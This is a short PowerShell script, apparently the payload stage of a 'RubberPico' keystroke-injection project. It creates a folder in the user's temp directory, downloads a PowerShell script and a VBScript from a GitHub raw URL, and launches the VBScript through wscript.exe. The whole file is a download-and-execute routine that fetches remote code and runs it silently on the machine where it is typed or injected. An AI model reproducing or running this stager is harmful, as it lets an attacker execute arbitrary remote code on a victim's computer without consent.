$ruta = "$env:TEMP\data_SP"
mkdir $ruta -Force

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jndr332/RubberPico/refs/heads/main/script.ps1" -OutFile "$ruta\script.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jndr332/RubberPico/refs/heads/main/autorun.vbs" -OutFile "$ruta\launcher.vbs"

# Ejecutar el VBS correctamente
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$ruta\launcher.vbs`""
